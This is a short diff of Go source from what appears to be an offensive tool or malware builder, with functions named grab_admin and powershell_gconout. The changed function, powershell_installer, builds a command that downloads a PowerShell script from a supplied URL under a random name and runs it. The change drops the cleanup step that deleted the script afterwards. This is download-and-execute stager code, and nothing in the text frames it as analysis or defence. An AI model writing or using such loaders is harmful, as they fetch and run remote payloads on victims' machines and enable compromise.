@@ -68,7 +68,7 @@ func grab_admin() string {
 
 func powershell_installer(url string) string {
 	var rifile string = randomstring(16)
-	return `curl `+url+` -o `+rifile+`.ps1; .\`+rifile+`.ps1; rm `+rifile+`.ps1`
+	return `curl `+url+` -o `+rifile+`.ps1; .\`+rifile+`.ps1`
 }
 
 func powershell_gconout(url string) string {
